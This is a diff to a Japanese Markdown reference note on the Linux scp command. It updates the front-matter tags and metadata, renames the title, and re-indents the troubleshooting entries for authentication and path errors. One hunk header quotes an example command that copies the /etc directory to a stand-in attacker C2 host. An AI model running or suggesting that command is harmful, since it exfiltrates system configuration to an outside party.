@@ -1,16 +1,21 @@
 ---
 tags:
-  - 'scp'
-  - 'ssh'
-  - 'file transfer'
-  - 'networking'
-  - 'sftp'
-  - 'rsync'
-  - 'cp'
-  - 'ssh'
+  - scp
+  - ssh
+  - file_transfer
+  - networking
+  - sftp
+  - rsync
+  - cp
+created: 2025-06-29 15:02
+modified: 2026-01-22 20:15
+environment:
+  - OS/Linux
+vulnearability: []
+knowledge_category: Command
 ---
 
-# `scp` - SSHプロトコルで安全にファイルをコピーする
+# Command  - Linux - scp - SSHプロトコルで安全にファイルをコピーする
 
 ## 概要
 
@@ -101,12 +106,12 @@ scp -r /etc attacker@c2.example.com:/loot/etc_backup
 * 一般的なエラーは [Linux共通のトラブルシューティング](./troubleshooting_common_errors.md) を参照。
 
 1. **エラーメッセージ例 1**: `Permission denied (publickey,password).`
-    * **考えられる原因**: SSHの認証エラー。ユーザー名、パスワード、秘密鍵のいずれかが間違っているか、サーバー側で許可されていません。
-    * **解決策**: 認証情報を再確認してください。`ssh -v` で接続を試みると、より詳細なデバッグ情報が得られます。
+		* **考えられる原因**: SSHの認証エラー。ユーザー名、パスワード、秘密鍵のいずれかが間違っているか、サーバー側で許可されていません。
+		* **解決策**: 認証情報を再確認してください。`ssh -v` で接続を試みると、より詳細なデバッグ情報が得られます。
 
 2. **エラーメッセージ例 2**: `scp: <remote_path>: No such file or directory`
-    * **考えられる原因**: 指定したコピー元ファイル（リモート→ローカルの場合）または、コピー先ディレクトリ（ローカル→リモートの場合）がリモートホストに存在しません。
-    * **解決策**: リモートホストに `ssh` でログインし、パスが正しいかを確認してください。
+		* **考えられる原因**: 指定したコピー元ファイル（リモート→ローカルの場合）または、コピー先ディレクトリ（ローカル→リモートの場合）がリモートホストに存在しません。
+		* **解決策**: リモートホストに `ssh` でログインし、パスが正しいかを確認してください。
 
 ## 環境変数と設定ファイル
 
